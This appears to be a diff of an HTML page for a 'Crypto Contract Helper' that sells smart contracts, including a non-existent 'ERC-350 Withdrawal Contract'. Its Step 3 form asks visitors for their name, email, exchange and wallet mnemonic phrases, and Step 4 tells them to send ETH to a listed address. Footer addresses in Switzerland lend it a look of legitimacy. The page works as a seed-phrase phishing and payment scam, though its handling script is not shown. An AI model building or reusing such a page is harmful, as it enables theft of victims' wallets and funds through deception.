@@ -2,88 +2,119 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Crypto Helper Tools</title>
-  <link rel="stylesheet" href="styles.css"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypto Contract Helper</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
+  <div class="background-animation"></div>
+
   <header>
-    <h1>Crypto Helper Tools</h1>
+    <h1 class="glow">Crypto Helper Tools</h1>
+    <p>Smart Contract Configurator</p>
   </header>
 
   <main>
     <div class="container">
       <!-- Step 1 -->
-      <section id="step1" class="step">
+      <div id="step1" class="step active">
         <h2>Step 1: Network and Contract Type</h2>
-        <label for="network">Select Network:</label>
-        <select id="network">
-          <option value="Ethereum">Ethereum</option>
-          <option value="Tron">Tron</option>
-          <option value="BNB">BNB Chain</option>
-          <option value="Polygon">Polygon</option>
-          <option value="Avalanche">Avalanche</option>
-        </select>
-
-        <label for="contractType">Select Contract Type:</label>
-        <select id="contractType">
-          <option value="erc20">Token Contract (ERC-20)</option>
-          <option value="erc350">Withdrawal Contract (ERC-350)</option>
-          <option value="erc721">NFT Contract (ERC-721)</option>
-          <option value="dao">DAO Contract</option>
-          <option value="staking">Staking Contract</option>
-          <option value="ico">ICO/IDO Contract</option>
-        </select>
-
+        <div class="form-group">
+          <label for="network">Select Network</label>
+          <select id="network">
+            <option value="">-- Choose Network --</option>
+            <option value="Ethereum">Ethereum</option>
+            <option value="Tron">Tron</option>
+            <option value="BNB Chain">BNB Chain</option>
+            <option value="Polygon">Polygon</option>
+            <option value="Avalanche">Avalanche</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label for="contractType">Select Contract Type</label>
+          <select id="contractType">
+            <option value="">-- Choose Contract Type --</option>
+            <option value="ERC-20">Token Contract (ERC-20)</option>
+            <option value="ERC-350">Withdrawal Contract (ERC-350)</option>
+            <option value="ERC-721">NFT Contract (ERC-721)</option>
+            <option value="DAO">DAO Contract</option>
+            <option value="Staking">Staking Contract</option>
+            <option value="ICO">ICO/IDO Contract</option>
+          </select>
+        </div>
         <button onclick="goToStep2()">Proceed</button>
-      </section>
+      </div>
 
       <!-- Step 2 -->
-      <section id="step2" class="step hidden">
-        <h2>Step 2: Contract Options & Pricing</h2>
-        <button onclick="toggleCurrency()">Toggle Currency: <span id="currency">USD</span></button>
-        <div id="contractOptions"></div>
-      </section>
+      <div id="step2" class="step">
+        <h2>Step 2: Choose a Tier</h2>
+        <div class="form-group">
+          <label for="currency">Currency</label>
+          <select id="currency" onchange="updatePrices()">
+            <option value="USD">USD</option>
+            <option value="CAD">CAD</option>
+            <option value="EUR">EUR</option>
+          </select>
+        </div>
+        <div id="tiersContainer"></div>
+        <button onclick="goToStep3()">Choose</button>
+      </div>
 
       <!-- Step 3 -->
-      <section id="step3" class="step hidden">
+      <div id="step3" class="step">
         <h2>Step 3: Connect Wallet & Form</h2>
-        <form id="detailsForm">
-          <input type="text" placeholder="Name" required />
-          <input type="text" placeholder="Surname" required />
-          <select required>
-            <option value="">Select Country</option>
-            <option value="Switzerland">Switzerland</option>
-            <option value="Germany">Germany</option>
-            <option value="USA">USA</option>
-            <!-- More countries -->
-          </select>
-          <select required>
-            <option value="">Select Exchanger</option>
-            <option value="Binance">Binance</option>
-            <option value="Coinbase">Coinbase</option>
-            <option value="Kraken">Kraken</option>
-            <option value="OKX">OKX</option>
-          </select>
-          <div class="mnemonics">
-            <label>Mnemonic Phrases:</label>
-            <div id="mnemonicInputs"></div>
+        <form id="userForm">
+          <div class="form-group">
+            <label>Name</label>
+            <input type="text" required />
           </div>
-          <button type="submit">Proceed</button>
+          <div class="form-group">
+            <label>Surname</label>
+            <input type="text" required />
+          </div>
+          <div class="form-group">
+            <label>Country</label>
+            <select>
+              <option>USA</option>
+              <option>Canada</option>
+              <option>Switzerland</option>
+              <!-- Add more -->
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Crypto Exchanger</label>
+            <select>
+              <option>Binance</option>
+              <option>Coinbase</option>
+              <option>Kraken</option>
+              <option>OKX</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Email</label>
+            <input type="email" required />
+          </div>
+          <div class="form-group mnemonics">
+            <label>Mnemonic Phrases</label>
+            <div id="mnemonics"></div>
+          </div>
         </form>
-      </section>
+        <button onclick="goToStep4()">Proceed</button>
+      </div>
 
       <!-- Step 4 -->
-      <section id="step4" class="step hidden">
+      <div id="step4" class="step">
         <h2>Step 4: Payment Details</h2>
-        <p>You are purchasing: <strong id="selectedContract"></strong></p>
-        <p>Please send <strong><span id="ethAmount"></span> ETH</strong></p>
+        <p>You are purchasing: <span id="selectedTierName"></span></p>
+        <p>Please send the amount: <span id="ethPrice"></span> ETH</p>
         <p>Network: Ethereum</p>
-        <p>Address: <span id="walletAddress">0x123456789abcdef000</span>
-          <button onclick="copyAddress()">Copy</button></p>
-        <canvas id="qrcode" width="120" height="120"></canvas>
-        <p id="loader">Waiting for payment…</p>
-      </section>
+        <p class="payment-address" id="paymentAddress">0x1234567890abcdef1234567890abcdef00</p>
+        <button onclick="copyAddress()">Copy Address</button>
+        <div class="loader"></div>
+        <img id="qrCode" src="https://api.qrserver.com/v1/create-qr-code/?data=0x1234567890abcdef1234567890abcdef00&size=150x150" alt="QR Code">
+        <p>Waiting for payment…</p>
+      </div>
     </div>
   </main>
 
@@ -91,12 +122,11 @@
     <p><strong>What are Networks?</strong></p>
     <ul>
       <li>Ethereum: The most widely used, supports ERC-20 tokens.</li>
-      <li>Binance Smart Chain: A faster, cheaper alternative to Ethereum.</li>
+      <li>Binance Smart Chain (BSC): A faster, cheaper alternative to Ethereum.</li>
       <li>Tron: Known for low fees and fast transactions.</li>
       <li>Polygon: A Layer 2 solution built on Ethereum for scalability.</li>
     </ul>
-    <p>© 2025 Crypto Helper Tools. All rights reserved.</p>
-    <p>Rue des Alpes 15, 1201 Genève, Switzerland</p>
+    <p>© 2025 Crypto Helper Tools. All rights reserved. | Bahnhofstrasse 100, 8001 Zürich, Switzerland</p>
   </footer>
 
   <script src="script.js"></script>
